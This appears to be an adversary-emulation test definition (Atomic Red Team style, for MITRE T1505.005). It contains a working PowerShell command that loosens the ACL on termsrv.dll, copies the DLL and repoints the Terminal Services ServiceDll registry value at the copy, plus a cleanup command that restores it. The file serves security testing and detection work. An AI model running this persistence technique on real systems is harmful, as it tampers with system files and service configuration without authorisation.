- requirements: []
  name: Soumaia ART Tests - Modify Terminal Services DLL Path
  description: This atomic test simulates the modification of the ServiceDll value in HKLM\System\CurrentControlSet\services\TermService\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code. (requires elevation)
  tactic: persistence
  technique_id: T1505.005
  technique_name: 'Server Software Component: Terminal Services DLL'
  executors:
  - cleanup:
    - Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters" -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: '$termsrvDll = "C:\Windows\System32\termsrv.dll"; $ACL = Get-Acl $termsrvDll; $permission = "Administrators","FullControl","Allow"; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL; Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"; $newServiceDll = "$HOME\AtomicTest.dll"; $registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters"; if (Test-Path -Path $registryPath) { Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll; Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll" } else { Write-Host "Registry key not found. Make sure the ''TermService\Parameters'' key exists." }'
  id: 151855a5-ed3a-535b-a3a3-870f3858a89a
